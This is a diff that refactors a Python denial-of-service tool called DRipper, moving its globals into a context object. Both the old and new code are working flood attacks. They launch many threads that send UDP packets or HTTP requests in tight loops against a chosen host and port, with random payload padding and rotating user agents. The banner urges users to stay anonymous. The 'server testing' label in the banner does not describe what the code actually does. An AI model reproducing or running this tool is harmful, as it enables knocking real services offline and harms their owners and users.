@@ -7,47 +7,84 @@ import threading
 import time
 import subprocess
 import urllib.request
+from dataclasses import dataclass, field
 from optparse import OptionParser
 
-
 # Constants
+USAGE = 'Usage: python %prog [options] arg'
+EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
 GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"
 
 
-def user_agent():
-    global uagent
+@dataclass
+class Context:
+    """Class for passing a context to a parallel processes."""
+    # Input params
+    host: str = ''
+    port: int = 80
+    threads: int = 100
+    random_packet_len: bool = False
+    attack_method: str = None
+    protocol: str = 'http://'
+    url: str = None
 
-    uagents = open("useragents.txt", "r")
-    uagent = uagents.readlines()
-    uagents.close()
-    return uagent
+    # Internal vars
+    user_agents: list = None
+    base_headers: list = None
+    headers = None
+
+    # Statistic
+    external_ip: str = ''
+    packets_sent: int = 0
+    connections_success: int = 0
+    connections_failed: int = 0
+    errors: list[str] = field(default_factory=list)
 
 
-def headers():
-    # reading headers
-    global data
-    headers = open("headers.txt", "r")
-    data = headers.read()
-    headers.close()
+def init_context(_ctx, args):
+    """Initialize Context from Input args."""
+    _ctx.host = args[0].host
+    _ctx.port = args[0].port
+    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
+    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"
+
+    _ctx.threads = args[0].threads
+
+    _ctx.attack_method = args[0].attack_method
+    _ctx.random_packet_len = bool(args[0].random_packet_len)
+
+    _ctx.user_agents = readfile('useragents.txt')
+    _ctx.base_headers = readfile('headers.txt')
+    _ctx.headers = set_headers_dict(_ctx.base_headers)
+
+    _ctx.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 
 
-def set_headers_dict():
-    # reading headers
-    global headers_dict
-    headers = open("headers.txt", "r")
-    content = headers.readlines()
+def readfile(filename: str):
+    """Read string from file."""
+    file = open(filename, "r")
+    content = file.readlines()
+    file.close()
+
+    return content
+
+
+def set_headers_dict(base_headers: list[str]):
+    """Set headers for the request"""
     headers_dict = {}
-    for item in content:
-        parts = item.split(':')
+    for line in base_headers:
+        parts = line.split(':')
         headers_dict[parts[0]] = parts[1].strip()
-    headers.close()
+
+    return headers_dict
 
 
 def get_random_string(len_from, len_to):
-    # Random string with different length
+    """Random string with different length"""
     length = random.randint(len_from, len_to)
     letters = string.ascii_lowercase
     result_str = ''.join(random.choice(letters) for i in range(length))
+
     return result_str
 
 
@@ -56,164 +93,154 @@ def get_random_port():
     return random.choice(ports)
 
 
-def down_it_udp():
-    global packet_count
+def down_it_udp(_ctx):
     i = 1
     while True:
-        if random_packet_len:
-            extra_data = get_random_string(0, 50000)
-        else:
-            extra_data = ''
+        extra_data = get_random_string(0, 5000) if _ctx.random_packet_len else ''
+
         packet = str(
-            "GET / HTTP/1.1\nHost: " + host
+            "GET / HTTP/1.1\nHost: " + _ctx.host
             + "\n\n User-Agent: "
-            + random.choice(uagent)
-            + "\n" + data
+            + random.choice(_ctx.user_agents)
+            + "\n" + _ctx.base_headers[0]
             + "\n\n" + extra_data).encode('utf-8')
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        p = int(port) if port else get_random_port()
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # p = int(_ctx.port) if _ctx.port else get_random_port()
 
         try:
-            s.sendto(packet, (host, p))
+            sock.sendto(packet, (_ctx.host, _ctx.port))
         except socket.gaierror:
-            if GETTING_SERVER_IP_ERROR_MSG not in errors:
-                errors.append(GETTING_SERVER_IP_ERROR_MSG)
+            if GETTING_SERVER_IP_ERROR_MSG not in _ctx.errors:
+                _ctx.errors.append(GETTING_SERVER_IP_ERROR_MSG)
         else:
-            if GETTING_SERVER_IP_ERROR_MSG in errors:
-                errors.remove(GETTING_SERVER_IP_ERROR_MSG)
-            packet_count += 1
+            if GETTING_SERVER_IP_ERROR_MSG in _ctx.errors:
+                _ctx.errors.remove(GETTING_SERVER_IP_ERROR_MSG)
+            _ctx.packets_sent += 1
             # print('\033[92m Packet was sent \033[0;0m')
-        s.close()
+        sock.close()
 
-        if port:
+        if _ctx.port:
             i += 1
             if i == 50:
                 i = 1
-                thread = threading.Thread(target=connect_host)
+                thread = threading.Thread(target=connect_host, args=[_ctx])
                 thread.daemon = True
                 thread.start()
         time.sleep(.01)
 
 
-def down_it_http():
-    global packet_count
+def down_it_http(_ctx: Context):
     while True:
-        protocol = 'http://'
-        if port == 443:
-            protocol = 'https://'
-
-        url = f"{protocol}{host}:{port}"
-        http_headers = headers_dict
-        http_headers['User-Agent'] = random.choice(uagent).strip()
+        http_headers = _ctx.headers
+        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()
 
         try:
             urllib.request.urlopen(
-                urllib.request.Request(url, headers=http_headers)
-            )
+                urllib.request.Request(_ctx.url, headers=http_headers))
         except:
-            connections['fail'] += 1
+            _ctx.connections_failed += 1
         else:
-            connections['success'] += 1
+            _ctx.connections_success += 1
             # print('\033[92m HTTP-Request was done \033[0;0m')
 
-        packet_count += 1
+        _ctx.packets_sent += 1
         time.sleep(.01)
 
 
-def usage():
-    print(''' \033[0;95mDDos Ripper
+def logo():
+    print(''' \033[0;95m
 
-	It is the end user's responsibility to obey all applicable laws.
-	It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! \n
-	Usage : python3 dripper.py [-s] [-p] [-t] [-pr]
-	-h : -help
-	-s : -server ip
-	-p : -port default 80
-	-t : -threads default 100\033[0m ''')
+██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
+██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
+██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
+██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
+██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
+╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
 
+It is the end user's responsibility to obey all applicable laws.
+It is just like a server testing script and Your IP is visible. Please, make sure you are anonymous!
+    \033[0m ''')
+
+
+def usage(parser):
+    """Wrapper for Logo with help."""
+    logo()
+    parser.print_help()
     sys.exit()
 
 
-def get_parameters():
-    global host
-    global port
-    global thr
-    global item
-    global random_packet_len
-    global attack_method
-    global headers_dict
-    optp = OptionParser(add_help_option=False, epilog="Rippers")
-    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
-    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
-    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
-    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
-    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
-                    help="Send random packets with random length")
-    optp.add_option("-m", "--method", type="str", dest="attack_method",
-                    help="Attack method: udp (default), http")
-    opts, args = optp.parse_args()
-    if opts.help:
-        usage()
-    if opts.host is not None:
-        host = opts.host
-    else:
-        usage()
-    if opts.port is None:
-        port = None
-    else:
-        port = opts.port
+def parse_args(parser):
+    """Initialize command line arguments parser and parse CLI arguments."""
+    parser_add_options(parser)
 
-    if opts.threads is None:
-        thr = 100
-    else:
-        thr = opts.threads
-
-    if opts.random_packet_len:
-        random_packet_len = True
-    else:
-        random_packet_len = False
-
-    if opts.attack_method and opts.attack_method in ['udp', 'http']:
-        attack_method = opts.attack_method
-    else:
-        attack_method = 'udp'
+    return parser.parse_args()
 
 
-def check_host():
+def parser_add_options(parser):
+    """Add options to a parser."""
+    parser.add_option('-p', '--port',
+                      dest='port', type='int', default=80,
+                      help='port (default: 80)')
+    parser.add_option('-t', '--threads',
+                      dest='threads', type='int', default=100,
+                      help='threads (default: 100)')
+    parser.add_option('-r', '--random_len',
+                      dest='random_packet_len', type='int',
+                      help='Send random packets with random length')
+    parser.add_option('-m', '--method',
+                      dest='attack_method', type='str', default='udp',
+                      help='Attack method: UDP (default), HTTP')
+    parser.add_option('-s', '--server',
+                      dest='host',
+                      help='Attack to server IP')
+
+
+def check_host(host):
+    """Check Server IP."""
+    error_msg = "\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m"
+    if not host:
+        print(error_msg)
+        exit(1)
+
     try:
         socket.gethostbyname(host)
     except:
-        return False
-    else:
-        return True
+        print(error_msg)
+        exit(1)
 
 
-def connect_host():
+def connect_host(_ctx: Context):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
-        s.connect((host, int(port)))
+        s.connect((_ctx.host, _ctx.port))
     except:
-        connections['fail'] += 1
+        _ctx.connections_failed += 1
     else:
-        connections['success'] += 1
+        _ctx.connections_success += 1
 
 
-def show_statistics():
-    # Prints statistics to console
-    subprocess.call("clear")
-    subprocess.call("clear")  # Hack for docker
-    m = f"Host, port: \033[94m{host}:{port}\033[0m\n"
-    m += f"Attack method: \033[94m{attack_method}\033[0m\n"
-    m += f"Threads: \033[94m{thr}\033[0m\n\n"
-    if attack_method == 'udp' and random_packet_len:
+def show_statistics(_ctx: Context):
+    """Prints statistics to console."""
+    subprocess.call('clear')
+    subprocess.call('clear')  # Hack for docker
+
+    logo()
+    m = f"Your current IP: \033[94m{_ctx.external_ip}\033[0m\n"
+    m += f"Host, port: \033[94m{_ctx.host}:{_ctx.port}\033[0m\n"
+    m += f"Attack method: \033[94m{_ctx.attack_method}\033[0m\n"
+    m += f"Threads: \033[94m{_ctx.threads}\033[0m\n\n"
+
+    if _ctx.attack_method == 'udp' and _ctx.random_packet_len:
         m += f"Random packet length: yes\n"
-    if attack_method == 'udp':
-        m += f"UDP packets sent: \033[92m{packet_count}\033[0;0m\n"
-    elif attack_method == 'http':
-        m += f"HTTP requests sent: \033[92m{packet_count}\033[0;0m\n"
-    m += f"Connections: successful - \033[92m{connections['success']}\033[0;0m, failed - \033[91m{connections['fail']}\033[0m\n"
-    for error in errors:
+    if _ctx.attack_method == 'udp':
+        m += f"UDP packets sent: \033[92m{_ctx.packets_sent}\033[0;0m\n"
+    elif _ctx.attack_method == 'http':
+        m += f"HTTP requests sent: \033[92m{_ctx.packets_sent}\033[0;0m\n"
+
+    m += f"Connections: successful - \033[92m{_ctx.connections_success}\033[0;0m, failed - \033[91m{_ctx.connections_failed}\033[0m\n"
+    for error in _ctx.errors:
         m += error + '\n'
     sys.stdout.write(m)
     sys.stdout.flush()
@@ -221,43 +248,35 @@ def show_statistics():
 
 def main():
     """The main function to run the script from the command line."""
-    global packet_count
-    global connections
-    global errors
-
-    packet_count = 0
-    errors = []
-    connections = {
-        'success': 0,
-        'fail': 0,
-    }
+    parser = OptionParser(usage=USAGE, epilog=EPILOG)
+    args = parse_args(parser)
 
     if len(sys.argv) < 2:
-        usage()
-    get_parameters()
+        usage(parser)
 
-    if not check_host():
-        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
-        exit()
+    _ctx = Context()
+    init_context(_ctx, args)
 
-    p = str(port) if port else '(22, 53, 80, 443)'
+    check_host(_ctx.host)
+    connect_host(_ctx)
+
+    # p = str(_port) if _port else '(22, 53, 80, 443)'
+    print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
     print("\033[94mPlease wait...\033[0m")
-    user_agent()
-    headers()
-    time.sleep(2)
 
-    thrs = []
-    for i in range(int(thr)):
-        if attack_method == 'udp':
-            thrs.append(threading.Thread(target=down_it_udp))
-        elif attack_method == 'http':
-            set_headers_dict()
-            thrs.append(threading.Thread(target=down_it_http))
-        thrs[i].daemon = True  # if thread is exist, it dies
-        thrs[i].start()
+    time.sleep(3)
+
+    thread_pool = []
+    for i in range(int(_ctx.threads)):
+        if _ctx.attack_method == 'udp':
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
+        elif _ctx.attack_method == 'http':
+            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        thread_pool[i].daemon = True  # if thread is exist, it dies
+        thread_pool[i].start()
 
     while True:
-        show_statistics()
+        show_statistics(_ctx)
         time.sleep(3)
 
 
